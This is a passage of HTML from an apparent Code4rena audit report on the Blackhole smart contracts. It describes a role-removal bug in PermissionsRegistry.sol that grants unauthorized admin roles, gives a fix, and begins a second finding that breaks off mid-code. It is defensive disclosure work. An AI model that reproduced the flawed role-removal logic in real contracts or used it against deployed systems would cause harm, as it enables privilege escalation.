href=\"#m-02-critical-access-control-flaw-role-removal-logic-incorrectly-grants-unauthorized-roles\" aria-label=\"m 02 critical access control flaw role removal logic incorrectly grants unauthorized roles permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-218\"\u003e[M-02] Critical access control flaw: Role removal logic incorrectly grants unauthorized roles\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-184\"\u003erayss\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-311\"\u003eKineticsOfWeb3\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/PermissionsRegistry.sol#L113\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/PermissionsRegistry.sol#L113\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-1\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-1\" aria-label=\"finding description 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003eremoveRole()\u003c/code\u003e function incorrectly updates a user’s role list by replacing a removed role with the last role from the \u003ccode\u003eglobal_roles\u003c/code\u003e array. This results in unintended and unauthorized role assignments to users.\u003c/p\u003e\n\u003cp\u003eThe \u003ccode\u003eremoveRole()\u003c/code\u003e function correctly removes a role from the system by deleting it from the global roles list. However, when updating the users’ assigned roles arrays, the current logic mistakenly replaces the removed role with the last role from the global roles list rather than just deleting the role from the array. \u003c/p\u003e\n\u003cp\u003eWhen removing a role from a user’s assigned roles array (\u003ccode\u003e_addressToRoles[user]\u003c/code\u003e), the function tries to keep the array compact by replacing the role to be removed with the last element of the \u003ccode\u003eglobal_roles\u003c/code\u003e array. This is incorrect because it mistakenly assigns a completely unrelated role from the global roles list to the user, corrupting their role assignments.\u003c/p\u003e\n\u003cp\u003eThis causes unrelated global roles to be incorrectly assigned to the user whose role is being removed.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-example\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-example\" aria-label=\"proof of concept example permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept (Example)\u003c/h3\u003e\n\u003cp\u003eAssume the \u003ccode\u003eglobal_roles\u003c/code\u003e array contains:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"17\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;GOVERNANCE\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;VOTER_ADMIN\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;GAUGE_ADMIN\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;BRIBE_ADMIN\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAlice has two roles:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"18\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003e_addressToRoles\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAlice\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = [\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;VOTER_ADMIN\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;GAUGE_ADMIN\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eCalling \u003ccode\u003eremoveRole(\"GAUGE_ADMIN\")\u003c/code\u003e results in:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"19\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003e_addressToRoles\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAlice\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_roles\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_roles\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// \u0026quot;BRIBE_ADMIN\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003e_addressToRoles\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAlice\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epop\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// removes last element\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAlice’s roles become:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"20\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;VOTER_ADMIN\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;BRIBE_ADMIN\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eNow Alice has Alice unintentionally gains the \u003ccode\u003eBRIBE_ADMIN\u003c/code\u003e role without authorization.\u003c/p\u003e\n\u003ch3 id=\"impact-2\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-2\" aria-label=\"impact 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eThis bug leads to privilege escalation — a user can be granted a role they were never assigned, simply due to role removal logic. If roles like \u003ccode\u003eBRIBE_ADMIN\u003c/code\u003e or \u003ccode\u003eGAUGE_ADMIN\u003c/code\u003e are mistakenly granted.\u003c/li\u003e\n\u003cli\u003eBroken access control due to corrupted role removal logic.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"severity-justification\" style=\"position:relative;\"\u003e\u003ca href=\"#severity-justification\" aria-label=\"severity justification permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eSeverity Justification\u003c/h3\u003e\n\u003cp\u003eThis issue is classified as high severity because it directly compromises the integrity of the protocol’s access control system. By unintentionally assigning incorrect roles during the removal process, users may be granted powerful administrative permissions such as \u003ccode\u003eGAUGE_ADMIN\u003c/code\u003e or \u003ccode\u003eBRIBE_ADMIN\u003c/code\u003e (or any other role) without proper authorization. These roles often govern critical operations, which can influence protocol behavior.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"21\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eatr\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ekeccak256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eatr\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]) == \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ekeccak256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_role\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eatr\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eatr\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eatr\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Replace with last element\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eatr\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epop\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();                    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Remove last element\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ebreak\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe mitigation correctly updates the user’s assigned roles array (\u003ccode\u003e_addressToRoles[user]\u003c/code\u003e) without referencing the \u003ccode\u003eglobal_roles\u003c/code\u003e array. When removing a role, it swaps the role to be removed with the last element in the user’s own roles array and then removes (pops) the last element. This preserves the compactness and order of the array while ensuring only roles actually assigned to the user remain.\u003c/p\u003e\n\u003cp\u003eCrucially, it avoids mistakenly assigning unrelated roles from the \u003ccode\u003eglobal_roles\u003c/code\u003e list, preventing corruption of the user’s role data and maintaining accurate access control.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-30\"\u003erayss\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-21\"\u003emaxvzuvex\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eThe sponsor team requested that the following note be included: \u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis issue originates from the upstream codebase, inherited from ThenaV2 fork. Given that ThenaV2 has successfully operated at scale for several months without incident, we assess the severity of this issue as low. The implementation has been effectively battle-tested in a production environment, which significantly reduces the practical risk associated with this finding.\nReference: \u003ca href=\"https://github.com/ThenafiBNB/THENA-Contracts/blob/main/contracts/PermissionsRegistry.sol#L108\"\u003ehttps://github.com/ThenafiBNB/THENA-Contracts/blob/main/contracts/PermissionsRegistry.sol#L108\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-03-1e10-fixed-farming-reward-in-gaugefactorycl\" style=\"position:relative;\"\u003e\u003ca href=\"#m-03-1e10-fixed-farming-reward-in-gaugefactorycl\" aria-label=\"m 03 1e10 fixed farming reward in gaugefactorycl permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-127\"\u003e[M-03] \u003ccode\u003e1e10\u003c/code\u003e fixed farming reward in \u003ccode\u003eGaugeFactoryCL\u003c/code\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-175\"\u003edanzero\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/AlgebraCLVe33/GaugeFactoryCL.sol#L75\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/AlgebraCLVe33/GaugeFactoryCL.sol#L75\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-descriptions-and-impact\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-descriptions-and-impact\" aria-label=\"finding descriptions and impact permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding descriptions and impact\u003c/h3\u003e\n\u003cp\u003eBelow is the implementation of the \u003ccode\u003ecreateEternalFarming\u003c/code\u003e function in \u003ccode\u003eGaugeFactoryCL.sol\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"22\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreateEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_algebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_rewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_bonusRewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAlgebraPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealgebraPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAlgebraPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint24\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etickSpacing\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003euint24\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealgebraPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etickSpacing\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e());\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epluginAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealgebraPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eplugin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIncentiveKey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentivekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetIncentiveKey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_rewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_bonusRewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_algebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eremainingTimeInCurrentEpoch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlackTimeLibrary\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eepochNext\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan 